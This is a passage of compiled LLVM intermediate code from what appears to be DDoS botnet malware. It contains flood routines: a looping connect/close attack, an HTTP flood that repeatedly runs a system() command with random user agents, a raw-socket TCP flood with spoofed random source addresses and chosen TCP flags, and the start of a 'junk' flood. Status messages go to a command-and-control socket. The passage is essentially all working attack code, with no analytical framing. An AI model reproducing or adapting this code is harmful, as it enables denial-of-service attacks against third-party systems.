  %14 = call i32 @inet_addr(i8* noundef %13) #12
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %16 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %15, i32 0, i32 0
  store i32 %14, i32* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = load i32, i32* %5, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 noundef zeroext %19) #15
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  br label %22

22:                                               ; preds = %26, %3
  %23 = load i32, i32* %7, align 4
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %25 = icmp sgt i32 %23, %24
  br i1 %25, label %26, label %34

26:                                               ; preds = %22
  %27 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #12
  store i32 %27, i32* %8, align 4
  %28 = load i32, i32* %8, align 4
  %29 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %30 = call i32 @connect(i32 noundef %28, %struct.sockaddr* noundef %29, i32 noundef 16)
  %31 = call i32 @sleep(i32 noundef 1)
  %32 = load i32, i32* %8, align 4
  %33 = call i32 @close(i32 noundef %32)
  br label %22, !llvm.loop !45

34:                                               ; preds = %22
  ret void
}

declare i32 @sleep(i32 noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @sendHTTP(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca [80 x i8*], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %9 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %10 = load i32, i32* %4, align 4
  %11 = add nsw i32 %9, %10
  store i32 %11, i32* %5, align 4
  %12 = call i32 @rand() #12
  %13 = sext i32 %12 to i64
  %14 = urem i64 %13, 23
  %15 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %14
  %16 = load i8*, i8** %15, align 8
  store i8* %16, i8** %7, align 8
  %17 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i64 0, i64 0
  %18 = bitcast i8** %17 to i8*
  %19 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %18, i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.57, i64 0, i64 0)) #12
  %20 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i64 0, i64 0
  %21 = bitcast i8** %20 to i8*
  %22 = load i8*, i8** %7, align 8
  %23 = call i8* @strcat(i8* noundef %21, i8* noundef %22) #12
  %24 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i64 0, i64 0
  %25 = bitcast i8** %24 to i8*
  %26 = call i8* @strcat(i8* noundef %25, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0)) #12
  %27 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i64 0, i64 0
  %28 = bitcast i8** %27 to i8*
  %29 = load i8*, i8** %3, align 8
  %30 = call i8* @strcat(i8* noundef %28, i8* noundef %29) #12
  br label %31

31:                                               ; preds = %35, %2
  %32 = load i32, i32* %5, align 4
  %33 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %34 = icmp sgt i32 %32, %33
  br i1 %34, label %35, label %58

35:                                               ; preds = %31
  %36 = call i32 @rand() #12
  %37 = sext i32 %36 to i64
  %38 = urem i64 %37, 23
  %39 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %38
  %40 = load i8*, i8** %39, align 8
  store i8* %40, i8** %7, align 8
  %41 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i64 0, i64 0
  %42 = bitcast i8** %41 to i8*
  %43 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %42, i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.57, i64 0, i64 0)) #12
  %44 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i64 0, i64 0
  %45 = bitcast i8** %44 to i8*
  %46 = load i8*, i8** %7, align 8
  %47 = call i8* @strcat(i8* noundef %45, i8* noundef %46) #12
  %48 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i64 0, i64 0
  %49 = bitcast i8** %48 to i8*
  %50 = call i8* @strcat(i8* noundef %49, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0)) #12
  %51 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i64 0, i64 0
  %52 = bitcast i8** %51 to i8*
  %53 = load i8*, i8** %3, align 8
  %54 = call i8* @strcat(i8* noundef %52, i8* noundef %53) #12
  %55 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i64 0, i64 0
  %56 = bitcast i8** %55 to i8*
  %57 = call i32 @system(i8* noundef %56)
  br label %31, !llvm.loop !46

58:                                               ; preds = %31
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* noundef, i8* noundef, ...) #4

; Function Attrs: nounwind
declare i8* @strcat(i8* noundef, i8* noundef) #4

declare i32 @system(i8* noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @sendTCP(i8* noundef %0, i32 noundef %1, i32 noundef %2, i32 noundef %3, i8* noundef %4, i32 noundef %5, i32 noundef %6) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i64, align 8
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.tcphdr*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %27 = load i32, i32* %14, align 4
  store i32 %27, i32* %15, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %9, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

31:                                               ; preds = %7
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

35:                                               ; preds = %7
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 noundef zeroext %37) #15
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

40:                                               ; preds = %35, %31
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* noundef %41, %struct.in_addr* noundef %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

45:                                               ; preds = %40
  br label %340

46:                                               ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %48, i8 0, i64 8, i1 false)
  %49 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #12
  store i32 %49, i32* %17, align 4
  %50 = load i32, i32* %17, align 4
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %55, label %52

52:                                               ; preds = %46
  %53 = load i32, i32* @mainCommSock, align 4
  %54 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %53, i8* noundef getelementptr inbounds ([27 x i8], [27 x i8]* @.str.55, i64 0, i64 0))
  br label %340

55:                                               ; preds = %46
  store i32 1, i32* %18, align 4
  %56 = load i32, i32* %17, align 4
  %57 = bitcast i32* %18 to i8*
  %58 = call i32 @setsockopt(i32 noundef %56, i32 noundef 0, i32 noundef 3, i8* noundef %57, i32 noundef 4) #12
  %59 = icmp slt i32 %58, 0
  br i1 %59, label %60, label %63

60:                                               ; preds = %55
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %61, i8* noundef getelementptr inbounds ([33 x i8], [33 x i8]* @.str.56, i64 0, i64 0))
  br label %340

63:                                               ; preds = %55
  %64 = load i32, i32* %11, align 4
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %67

66:                                               ; preds = %63
  store i32 0, i32* %19, align 4
  br label %73

67:                                               ; preds = %63
  %68 = load i32, i32* %11, align 4
  %69 = sub nsw i32 32, %68
  %70 = shl i32 1, %69
  %71 = sub nsw i32 %70, 1
  %72 = xor i32 %71, -1
  store i32 %72, i32* %19, align 4
  br label %73

73:                                               ; preds = %67, %66
  %74 = load i32, i32* %13, align 4
  %75 = sext i32 %74 to i64
  %76 = add i64 40, %75
  %77 = call i8* @llvm.stacksave()
  store i8* %77, i8** %20, align 8
  %78 = alloca i8, i64 %76, align 16
  store i64 %76, i64* %21, align 8
  %79 = bitcast i8* %78 to %struct.iphdr*
  store %struct.iphdr* %79, %struct.iphdr** %22, align 8
  %80 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %81 = bitcast %struct.iphdr* %80 to i8*
  %82 = getelementptr i8, i8* %81, i64 20
  %83 = bitcast i8* %82 to %struct.tcphdr*
  store %struct.tcphdr* %83, %struct.tcphdr** %23, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %86 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 4
  %88 = load i32, i32* %19, align 4
  %89 = call i32 @getRandomIP(i32 noundef %88)
  %90 = call i32 @htonl(i32 noundef %89) #15
  %91 = load i32, i32* %13, align 4
  %92 = sext i32 %91 to i64
  %93 = add i64 20, %92
  %94 = trunc i64 %93 to i32
  call void @makeIPPacket(%struct.iphdr* noundef %84, i32 noundef %87, i32 noundef %90, i8 noundef zeroext 6, i32 noundef %94)
  %95 = call i32 @rand_cmwc()
  %96 = trunc i32 %95 to i16
  %97 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %98 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %97, i32 0, i32 0
  %99 = bitcast %union.anon* %98 to %struct.anon.0*
  %100 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %99, i32 0, i32 0
  store i16 %96, i16* %100, align 4
  %101 = call i32 @rand_cmwc()
  %102 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon* %103 to %struct.anon.0*
  %105 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %104, i32 0, i32 2
  store i32 %101, i32* %105, align 4
  %106 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon* %107 to %struct.anon.0*
  %109 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %108, i32 0, i32 3
  store i32 0, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon* %111 to %struct.anon.0*
  %113 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %112, i32 0, i32 4
  %114 = load i16, i16* %113, align 4
  %115 = and i16 %114, -241
  %116 = or i16 %115, 80
  store i16 %116, i16* %113, align 4
  %117 = load i8*, i8** %12, align 8
  %118 = call i32 @strcmp(i8* noundef %117, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.59, i64 0, i64 0)) #11
  %119 = icmp ne i32 %118, 0
  br i1 %119, label %156, label %120

120:                                              ; preds = %73
  %121 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %122 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %121, i32 0, i32 0
  %123 = bitcast %union.anon* %122 to %struct.anon.0*
  %124 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %123, i32 0, i32 4
  %125 = load i16, i16* %124, align 4
  %126 = and i16 %125, -513
  %127 = or i16 %126, 512
  store i16 %127, i16* %124, align 4
  %128 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i32 0, i32 0
  %130 = bitcast %union.anon* %129 to %struct.anon.0*
  %131 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %130, i32 0, i32 4
  %132 = load i16, i16* %131, align 4
  %133 = and i16 %132, -1025
  %134 = or i16 %133, 1024
  store i16 %134, i16* %131, align 4
  %135 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %136 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %135, i32 0, i32 0
  %137 = bitcast %union.anon* %136 to %struct.anon.0*
  %138 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %137, i32 0, i32 4
  %139 = load i16, i16* %138, align 4
  %140 = and i16 %139, -257
  %141 = or i16 %140, 256
  store i16 %141, i16* %138, align 4
  %142 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %142, i32 0, i32 0
  %144 = bitcast %union.anon* %143 to %struct.anon.0*
  %145 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %144, i32 0, i32 4
  %146 = load i16, i16* %145, align 4
  %147 = and i16 %146, -4097
  %148 = or i16 %147, 4096
  store i16 %148, i16* %145, align 4
  %149 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %150 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %149, i32 0, i32 0
  %151 = bitcast %union.anon* %150 to %struct.anon.0*
  %152 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %151, i32 0, i32 4
  %153 = load i16, i16* %152, align 4
  %154 = and i16 %153, -2049
  %155 = or i16 %154, 2048
  store i16 %155, i16* %152, align 4
  br label %233

156:                                              ; preds = %73
  %157 = load i8*, i8** %12, align 8
  %158 = call i8* @strtok(i8* noundef %157, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #12
  store i8* %158, i8** %24, align 8
  br label %159

159:                                              ; preds = %230, %156
  %160 = load i8*, i8** %24, align 8
  %161 = icmp ne i8* %160, null
  br i1 %161, label %162, label %232

162:                                              ; preds = %159
  %163 = load i8*, i8** %24, align 8
  %164 = call i32 @strcmp(i8* noundef %163, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.61, i64 0, i64 0)) #11
  %165 = icmp ne i32 %164, 0
  br i1 %165, label %174, label %166

166:                                              ; preds = %162
  %167 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %168 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %167, i32 0, i32 0
  %169 = bitcast %union.anon* %168 to %struct.anon.0*
  %170 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %169, i32 0, i32 4
  %171 = load i16, i16* %170, align 4
  %172 = and i16 %171, -513
  %173 = or i16 %172, 512
  store i16 %173, i16* %170, align 4
  br label %230

174:                                              ; preds = %162
  %175 = load i8*, i8** %24, align 8
  %176 = call i32 @strcmp(i8* noundef %175, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.62, i64 0, i64 0)) #11
  %177 = icmp ne i32 %176, 0
  br i1 %177, label %186, label %178

178:                                              ; preds = %174
  %179 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %180 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %179, i32 0, i32 0
  %181 = bitcast %union.anon* %180 to %struct.anon.0*
  %182 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %181, i32 0, i32 4
  %183 = load i16, i16* %182, align 4
  %184 = and i16 %183, -1025
  %185 = or i16 %184, 1024
  store i16 %185, i16* %182, align 4
  br label %229

186:                                              ; preds = %174
  %187 = load i8*, i8** %24, align 8
  %188 = call i32 @strcmp(i8* noundef %187, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.63, i64 0, i64 0)) #11
  %189 = icmp ne i32 %188, 0
  br i1 %189, label %198, label %190

190:                                              ; preds = %186
  %191 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %192 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %191, i32 0, i32 0
  %193 = bitcast %union.anon* %192 to %struct.anon.0*
  %194 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %193, i32 0, i32 4
  %195 = load i16, i16* %194, align 4
  %196 = and i16 %195, -257
  %197 = or i16 %196, 256
  store i16 %197, i16* %194, align 4
  br label %228

198:                                              ; preds = %186
  %199 = load i8*, i8** %24, align 8
  %200 = call i32 @strcmp(i8* noundef %199, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i64 0, i64 0)) #11
  %201 = icmp ne i32 %200, 0
  br i1 %201, label %210, label %202

202:                                              ; preds = %198
  %203 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %204 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %203, i32 0, i32 0
  %205 = bitcast %union.anon* %204 to %struct.anon.0*
  %206 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %205, i32 0, i32 4
  %207 = load i16, i16* %206, align 4
  %208 = and i16 %207, -4097
  %209 = or i16 %208, 4096
  store i16 %209, i16* %206, align 4
  br label %227

210:                                              ; preds = %198
  %211 = load i8*, i8** %24, align 8
  %212 = call i32 @strcmp(i8* noundef %211, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.65, i64 0, i64 0)) #11
  %213 = icmp ne i32 %212, 0
  br i1 %213, label %222, label %214

214:                                              ; preds = %210
  %215 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %216 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %215, i32 0, i32 0
  %217 = bitcast %union.anon* %216 to %struct.anon.0*
  %218 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %219, -2049
  %221 = or i16 %220, 2048
  store i16 %221, i16* %218, align 4
  br label %226

222:                                              ; preds = %210
  %223 = load i32, i32* @mainCommSock, align 4
  %224 = load i8*, i8** %24, align 8
  %225 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %223, i8* noundef getelementptr inbounds ([18 x i8], [18 x i8]* @.str.66, i64 0, i64 0), i8* noundef %224)
  br label %226

226:                                              ; preds = %222, %214
  br label %227

227:                                              ; preds = %226, %202
  br label %228

228:                                              ; preds = %227, %190
  br label %229

229:                                              ; preds = %228, %178
  br label %230

230:                                              ; preds = %229, %166
  %231 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #12
  store i8* %231, i8** %24, align 8
  br label %159, !llvm.loop !47

232:                                              ; preds = %159
  br label %233

233:                                              ; preds = %232, %120
  %234 = call i32 @rand_cmwc()
  %235 = trunc i32 %234 to i16
  %236 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 0
  %238 = bitcast %union.anon* %237 to %struct.anon.0*
  %239 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %238, i32 0, i32 5
  store i16 %235, i16* %239, align 2
  %240 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  %242 = bitcast %union.anon* %241 to %struct.anon.0*
  %243 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %242, i32 0, i32 6
  store i16 0, i16* %243, align 4
  %244 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 0
  %246 = bitcast %union.anon* %245 to %struct.anon.0*
  %247 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %246, i32 0, i32 7
  store i16 0, i16* %247, align 2
  %248 = load i32, i32* %9, align 4
  %249 = icmp eq i32 %248, 0
  br i1 %249, label %250, label %252

250:                                              ; preds = %233
  %251 = call i32 @rand_cmwc()
  br label %257

252:                                              ; preds = %233
  %253 = load i32, i32* %9, align 4
  %254 = trunc i32 %253 to i16
  %255 = call zeroext i16 @htons(i16 noundef zeroext %254) #15
  %256 = zext i16 %255 to i32
  br label %257

257:                                              ; preds = %252, %250
  %258 = phi i32 [ %251, %250 ], [ %256, %252 ]
  %259 = trunc i32 %258 to i16
  %260 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 0
  %262 = bitcast %union.anon* %261 to %struct.anon.0*
  %263 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %262, i32 0, i32 1
  store i16 %259, i16* %263, align 2
  %264 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %265 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %266 = call zeroext i16 @tcpcsum(%struct.iphdr* noundef %264, %struct.tcphdr* noundef %265)
  %267 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %268 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %267, i32 0, i32 0
  %269 = bitcast %union.anon* %268 to %struct.anon.0*
  %270 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %269, i32 0, i32 6
  store i16 %266, i16* %270, align 4
  %271 = bitcast i8* %78 to i16*
  %272 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %273 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %272, i32 0, i32 2
  %274 = load i16, i16* %273, align 2
  %275 = zext i16 %274 to i32
  %276 = call zeroext i16 @csum(i16* noundef %271, i32 noundef %275)
  %277 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 7
  store i16 %276, i16* %278, align 2
  %279 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %280 = load i32, i32* %10, align 4
  %281 = add nsw i32 %279, %280
  store i32 %281, i32* %25, align 4
  store i32 0, i32* %26, align 4
  br label %282

282:                                              ; preds = %335, %334, %257
  br label %283

283:                                              ; preds = %282
  %284 = load i32, i32* %17, align 4
  %285 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %286 = call i64 @sendto(i32 noundef %284, i8* noundef %78, i64 noundef %76, i32 noundef 0, %struct.sockaddr* noundef %285, i32 noundef 16)
  %287 = load i32, i32* %19, align 4
  %288 = call i32 @getRandomIP(i32 noundef %287)
  %289 = call i32 @htonl(i32 noundef %288) #15
  %290 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 8
  store i32 %289, i32* %291, align 4
  %292 = call i32 @rand_cmwc()
  %293 = trunc i32 %292 to i16
  %294 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i32 0, i32 3
  store i16 %293, i16* %295, align 4
  %296 = call i32 @rand_cmwc()
  %297 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %298 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %297, i32 0, i32 0
  %299 = bitcast %union.anon* %298 to %struct.anon.0*
  %300 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %299, i32 0, i32 2
  store i32 %296, i32* %300, align 4
  %301 = call i32 @rand_cmwc()
  %302 = trunc i32 %301 to i16
  %303 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %304 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %303, i32 0, i32 0
  %305 = bitcast %union.anon* %304 to %struct.anon.0*
  %306 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %305, i32 0, i32 0
  store i16 %302, i16* %306, align 4
  %307 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %308 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %307, i32 0, i32 0
  %309 = bitcast %union.anon* %308 to %struct.anon.0*
  %310 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %309, i32 0, i32 6
  store i16 0, i16* %310, align 4
  %311 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %312 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %313 = call zeroext i16 @tcpcsum(%struct.iphdr* noundef %311, %struct.tcphdr* noundef %312)
  %314 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon* %315 to %struct.anon.0*
  %317 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %316, i32 0, i32 6
  store i16 %313, i16* %317, align 4
  %318 = bitcast i8* %78 to i16*
  %319 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i32 0, i32 2
  %321 = load i16, i16* %320, align 2
  %322 = zext i16 %321 to i32
  %323 = call zeroext i16 @csum(i16* noundef %318, i32 noundef %322)
  %324 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %325 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %324, i32 0, i32 7
  store i16 %323, i16* %325, align 2
  %326 = load i32, i32* %26, align 4
  %327 = load i32, i32* %15, align 4
  %328 = icmp eq i32 %326, %327
  br i1 %328, label %329, label %335

329:                                              ; preds = %283
  %330 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %331 = load i32, i32* %25, align 4
  %332 = icmp sgt i32 %330, %331
  br i1 %332, label %333, label %334

333:                                              ; preds = %329
  br label %338

334:                                              ; preds = %329
  store i32 0, i32* %26, align 4
  br label %282

335:                                              ; preds = %283
  %336 = load i32, i32* %26, align 4
  %337 = add i32 %336, 1
  store i32 %337, i32* %26, align 4
  br label %282

338:                                              ; preds = %333
  %339 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %339)
  br label %340

340:                                              ; preds = %338, %60, %52, %45
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8* noundef, i8* noundef) #1

; Function Attrs: nounwind
declare i8* @strtok(i8* noundef, i8* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @sendJUNK(i8* noundef %0, i32 noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca %struct.__sigset_t, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.__sigset_t*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %21 = call i32 @getdtablesize() #12
  %22 = sdiv i32 %21, 2
  store i32 %22, i32* %7, align 4
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %23, align 4
  %24 = load i32, i32* %5, align 4
  %25 = trunc i32 %24 to i16
  %26 = call zeroext i16 @htons(i16 noundef zeroext %25) #15
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = load i8*, i8** %4, align 8
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %30 = call i32 @getHost(i8* noundef %28, %struct.in_addr* noundef %29)
  %31 = icmp ne i32 %30, 0
  br i1 %31, label %32, label %33

32:                                               ; preds = %3
  br label %233

33:                                               ; preds = %3
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %35 = getelementptr inbounds [8 x i8], [8 x i8]* %34, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %35, i8 0, i64 8, i1 false)
  %36 = load i32, i32* %7, align 4
  %37 = zext i32 %36 to i64
  %38 = call i8* @llvm.stacksave()
  store i8* %38, i8** %10, align 8
